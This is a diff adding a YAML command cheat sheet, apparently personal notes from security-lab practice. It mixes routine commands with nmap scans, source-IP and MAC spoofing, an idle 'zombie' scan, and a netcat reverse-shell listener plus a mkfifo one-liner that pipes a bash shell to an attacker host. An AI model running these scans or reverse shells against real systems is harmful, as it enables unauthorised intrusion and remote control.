@@ -1,0 +1,23 @@
+commands:
+    - command: ls -lha
+      description: List directory contents with file sizes in human-readable form
+    - command: kubectl get pods
+      description: getting a list of all pods in the kubernetes cluster
+    - command: sudo nmap -sU MACINE_IP
+      description: nmap udp port scan, if a port is closed  an ICMP unreachable error is returned. If it is open but does not reply to ICMP messages you will not receive anything and can therefore conclude that such a port is open
+    - command: nmap -sT MACHINE_IP
+      description: nmap tcp scan
+    - command: sudo nmap -sA MACHINE_IP
+      description: nmap ack scan to test firewall configuration. The machine will always respond with a RST message regardless of the port state. But if no RST message is returned it could mean that the firewall is blocking communication to and from the machine.
+    - command: nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP [optional --spoof-mac SPOOFED_MAC]
+      description: nmap spoofing is useful if you can monitor the general network you are on and see if a ping reply is sent out. It is a way to ensure that the machine you are targeting wont know what the true ip that sent the ping is. If you are on the same subnet you can spoof the mac address as well
+    - command: nmap -sI ZOMBIE_IP MACHINE_IP
+      description: zombie scan where there is an idle host such as printer on the network. You first ping the idle host with nmap -sS ZOMBIE_IP and note the IP ID integer. Afterwards you use the zombie command to the have the idle target ping the host. Lastly you ping the zombie machine again. If the IP ID has been incremented with 2 it means that the target machine responded to the zombies ping and that the port is open.
+    - command: rvictl -s IPHONE_DEVICE_ID
+      description: open virtual interface for iPhone. ID can be found by connecting iPhone to computer and look at its information in finder
+    - command: nc -lnvp 4444
+      description: reverse shell where attacker is listening on 4444
+    - command: mkfifo /tmp/f; nc localhost 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
+      description: reverse shell where victim pc sets up a connection to the attackers pc in this case localhost
+    - command: python -m http.server 9999
+      description: setting up a server in the current directory so other devices can wget/curl files from it
